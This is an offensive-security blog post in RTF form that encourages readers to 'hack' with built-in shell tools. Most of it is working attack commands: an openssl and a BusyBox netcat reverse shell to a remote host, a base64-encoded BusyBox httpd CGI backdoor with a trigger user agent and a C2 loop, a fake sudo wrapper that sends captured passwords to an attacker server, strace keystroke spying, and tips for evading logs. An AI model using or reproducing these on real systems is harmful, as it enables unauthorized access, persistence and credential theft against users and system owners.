{\rtf1\ansi\ansicpg1252\uc1\deff0
{\fonttbl{\f0\fmodern\fcharset0\fprq2 Courier New;}}
{\colortbl;\red0\green0\blue0;\red255\green255\blue255;\red0\green0\blue255;}
\paperw12240\paperh15840\margl1800\margr1800\margt1440\margb1440\fet2\ftnbj\aenddoc
\pgnrestart\pgnstarts0
\pard\plain \sa240\sb280\ltrch\loch {\f0\fs28\b1\i0 Getting Busy at the Command Line }
\par\pard\plain \ltrch\loch {\f0\fs24\b0\i0 We all can get a little lazy relying on the frameworks that have arisen due to the monetization of offensive skills. In light of this, I wanted to make a short post to inspire people to explore what can still be done by rubbing two sticks together in a shell.\line }{\f0\fs24\b1\i0 TL;DR - The command line. Use it more, and harder.}{\f0\fs24\b0\i0 \line \line \line }
\par\pard\plain \sa240\sb240\ltrch\loch {\f0\fs24\b1\i0 Food for Thought -}
\par\pard\plain \ltrch\loch {\f0\fs24\b0\i0 There are thousands of command line tips, tricks, and hacks. I'll toss out a few examples I've used in the last month to get your creativity flowing.\line \line }
\par\pard\plain \sa240\sb280\ltrch\loch {\f0\fs28\b1\i0 Reverse \~SSL Shell:}
\par\pard\plain \ltrch\loch {\f0\fs24\b0\i0 A simple reverse shell using fifos and openssl s_client. There's a great deal you can do with this tool, take a look at the server options.\line mkfifo /tmp/sfd; /bin/bash -i < /tmp/sfd 2>&1 | openssl s_client -quiet -connect <RHOST>:<RPORT> > /tmp/sfd; rm /tmp/sfd\line \line \line }
\par\pard\plain \sa240\sb280\ltrch\loch {\f0\fs28\b1\i0 Resurrecting Netcat:}
\par\pard\plain \ltrch\loch {\f0\fs24\b0\i0 There are plenty of ways (pipes) to resurrect good old netcat, but have you ever looked inside of the nc applet in BusyBox? [-e PROG] is still a valid argument.\line busybox nc\~<RHOST> <RPORT>\~-e /bin/busybox ash\line \line \line }
\par\pard\plain \sa240\sb280\ltrch\loch {\f0\fs28\b1\i0 CGI Shell via BusyBox Httpd:}
\par\pard\plain \ltrch\loch {\f0\fs24\b0\i0 Ever browse the }{\field{\*\fldinst HYPERLINK "http://git.busybox.net/busybox/plain/"}{\fldrslt\f0\fs24\b0\i0\ul\ulc0\cf3 source}}{\f0\fs24\b0\i0  of some of the tools on your box? Here's a little cgi shell using the }{\field{\*\fldinst HYPERLINK "http://git.busybox.net/busybox/plain/networking/httpd.c"}{\fldrslt\f0\fs24\b0\i0\ul\ulc0\cf3 httpd}}{\f0\fs24\b0\i0  applet in BusyBox.\line \line }{\f0\fs24\b1\i0 Httpd Backdoor}{\f0\fs24\b0\i0 \line mkdir -p /tmp/s/cgi-bin;(base64 -d <<<IyEvYmluL2Jhc2gKaWYgWyAiJFJFUVVFU1RfTUVUSE9EIiA9PSAiSEVBRCIgXSAmJiBbICIkSFRUUF9VU0VSX0FHRU5UIiA9PSAibm9wZSIgXTsgdGhlbgogICAgQz0kKGJhc2U2NCAtZCA8PDwgJFFVRVJZX1NUUklORykKICAgIGlmIFsgIiRDIiA9PSAiZXhpdCIgXTsgdGhlbgogICAgICAgIGVjaG8gIkNsZWFuIgogICAgICAgIHJtIC4vcAogICAgICAgIGtpbGwgJChwZ3JlcCBidXN5Ym94KQogICAgIGZpCiAgICAgZWNobyAkKGJhc2ggLWMgIiRDIikKZmkK)>/tmp/s/cgi-bin/p;chmod +x /tmp/s/cgi-bin/p; busybox httpd -f -p <LPORT> -h /tmp/s/; rm -rf /tmp/s/\line \line }{\f0\fs24\b1\i0 Self-Cleaning CGI Bash Shell}{\f0\fs24\b0\i0 \line Our backdoor is in the base64 above, and looks like the following.\line \line Maybe we want to restrict access by HTTP method or user agent? We can utilize the env vars passed to the httpd. Might as well clean up after ourselves while we are at it.\line #!/bin/bash\line if [ "$REQUEST_METHOD" == "HEAD" ] && [ "$HTTP_USER_AGENT" == "nope" ]; then\line \~ \~ C=$(base64 -d <<< $QUERY_STRING)\line \~ \~ if [ "$C" == "exit" ]; then\line \~ \~ \~ \~ echo "Clean"\line \~ \~ \~ \~ rm ./p\line \~ \~ \~ \~ kill $(pgrep busybox)\line \~ \~ \~fi\line \~ \~ \~echo $(bash -c "$C")\line fi\line \line }{\f0\fs24\b1\i0 C2}{\f0\fs24\b0\i0 \line Now whip up a quick loop on our controlling host that meets our triggers.\line COMMAND=''; while [ "$COMMAND" != "exit" ]; do read -p "$ " COMMAND; echo -e "HEAD /cgi-bin/p?$(base64<<<$COMMAND) HTTP/1.0\\nHost: \\nUser-Agent: nope\\n\\n" | ncat <RHOST> <RPORT>; done\line \line \line }
\par\pard\plain \sa240\sb280\ltrch\loch {\f0\fs28\b1\i0 RSA Keys as Vars:}
\par\pard\plain \ltrch\loch {\f0\fs24\b0\i0 Need our httpd cgi shell encrypted? Why not toss some RSA keys into variables via file pipes.\line myfullKey=$(openssl genrsa 2048 -outfile)\line mypubkey=$(openssl rsa -in <(echo "$myfullKey") -pubout)\line \line To get around key to data size issues, (and be more correct) use these to handle symmetric keys.\line I'll leave exact implementation up to you. The point of this post is to inspire ideas, get tinkering!\line openssl aes-256-cbc [-d] -pass pass:<symetric_key> -a\line \line \line }
\par\pard\plain \sa240\sb280\ltrch\loch {\f0\fs28\b1\i0 Privileged Escalation with Shell Wrappers:}
\par\pard\plain \ltrch\loch {\f0\fs24\b0\i0 last and history tell us a user logs on frequently and uses the sudo command.\line We could use LD_PRELOAD... or simply wrap sudo in a argument expanding function.\line \line We force a sudo timeout, fake an incorrect password entry, send the password encrypted to our server, then issue the user's original command by expanding their arguments.\line sudo () \{ /bin/echo [sudo] password for $USER: ; read -s yoink; openssl s_client -quiet -no_ign_eof -connect <RHOST>:<RPORT> <<<$USER:$yoink 2> /dev/null; echo "Sorry, try again."; /usr/bin/sudo -k; /usr/bin/sudo "$@"; \}\line Why bother cracking a password when you can have a user type it for you?\line This can also be done with an alias. Which can be hidden with control characters (think ^M).\line \line \line }
\par\pard\plain \sa240\sb280\ltrch\loch {\f0\fs28\b1\i0 Spy on Stdin by Tracing System Calls:}
\par\pard\plain \ltrch\loch {\f0\fs24\b0\i0 Need to know what a user is typing in their tty?\line sudo strace -f -p <tty_pid> 2>&1 | grep -o -e 'read(., \\".*", 1)'\line Note: We follow forks with -f in order to grab subprocess and sudo password input.\line \line \line }
\par\pard\plain \sa240\sb280\ltrch\loch {\f0\fs28\b1\i0 Fun with stdin Pipes:}
\par\pard\plain \ltrch\loch {\f0\fs24\b0\i0 Don't want the user to see your sudo wrapper, a command, or specific argument? There are dozens of ways to avoid logging with escapes and sub-shells (mail, gdb, ash).\line \line But what about creating a pipe of standard in?\line $(< /dev/stdin)\line <anything you want>\line ^D^D\~\line How could you further hide the process with shell wrappers, aliases, symlinks, exec renames?\line What I'm getting at here is, never underestimate the power of leveraging built-in tools in unintended ways.\line \line \line }
\par\pard\plain \sa240\sb320\ltrch\loch {\f0\fs36\b1\i0 The Mindset -}
\par\pard\plain \ltrch\loch {\f0\fs24\b0\i0 For me, this style of thinking is the true sense of "hacking." Learning about an environment or system until you understand what you can make it do, irrespective of what it was intended to do.\line \line Next time you look at a system, environment, or command, ask yourself the following. Does it: create sockets, alter data, read files, elevate privileges, control the flow of data, alter appearances to a user or process, impact commands before or after execution, alter keyboard entry, import anything from anywhere... ? The list and impact is only limited by your creativity.\line \line }{\f0\fs24\b1\i0 Enough soap-boxing, have a fun time in Las Vegas! Be safe.}{\f0\fs24\b0\i0 \line \line \line \line \line Go learn something...}}